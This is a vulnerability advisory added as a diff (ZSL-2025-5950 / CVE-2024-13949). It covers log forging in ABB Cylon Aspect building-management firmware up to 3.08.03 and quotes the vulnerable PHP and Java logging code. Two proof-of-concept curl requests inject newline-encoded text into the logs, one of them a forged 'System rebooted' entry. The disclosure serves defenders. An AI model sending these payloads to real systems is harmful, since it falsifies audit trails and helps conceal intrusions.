@@ -1,0 +1,112 @@
+
+ABB Cylon Aspect 3.08.03 (Java/PHP) Log Forging
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+                  Firmware: <=3.08.03
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+Desc: Multiple PHP and Java components across the system fail to properly
+sanitize user-supplied input before including it in application logs. In
+PHP, files like supervisorProxy.php directly embed values such as $_SERVER['REQUEST_URI']
+and raw POST bodies into log messages without filtering, enabling attackers
+to inject arbitrary log entries using encoded newline characters. Similarly,
+Java classes using LoggerUtil.logger.* methods concatenate user-controlled
+strings like usernames and cookie keys into logs without validation. This
+systemic flaw allows for log forging, manipulating log content to obfuscate
+activity, insert misleading entries, or facilitate follow-up attacks.
+
+Tested on: GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+           PHP/7.3.11
+           PHP/5.6.30
+           PHP/5.4.16
+           PHP/4.4.8
+           PHP/5.3.3
+           AspectFT Automation Application Server
+           lighttpd/1.4.32
+           lighttpd/1.4.18
+           Apache/2.2.15 (CentOS)
+           OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+           OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+           ErgoTech MIX Deployment Server 2.0.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5950
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5950.php
+
+CVE ID: CVE-2024-13949
+CVE URL: https://www.cve.org/CVERecord/SearchResults?query=CVE-2024-13949
+
+
+21.04.2024
+
+--
+
+
+$ cat project
+
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                                                            
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░                                               
+                                                                                                               
+
+$ cat supervisorProxy.php
+...
+...
+15: $vars = file_get_contents('php://input');
+16:
+17: $logTitle = "Proxy Supervisor ".$_SERVER['REQUEST_URI']." ";
+18: LoggerUtils::logWarning($logTitle." START", "POST: ".print_r($vars, true));
+19:
+20: $appId = 'supervisor1';
+...
+...
+
+$ curl "http://192.168.73.31/supervisorProxy.php/%0AWe Are Watching You!%0A"
+
+$ cat CookieDb.java
+...
+...
+import com.aamatrixc.util.LoggerUtil;
+..
+..
+LoggerUtil.logger.error or LoggerUtil.logger.debug or LoggerUtil.logger.info
+LoggerUtil.logger.error(getClass().getName() + "setUserCookie() failed validation for user/key: " + cookieInfo.getUser() + "/" + cookieInfo.getKey() + ((resultCheck == null) ? "... resultCheck is null!" : ""));
+...
+...
+
+$ curl http://192.168.73.31:7226/servlets/CookieDb?user=thricer%0A[INFO]%20System%20rebooted%20by%20amuser&key=yolo'
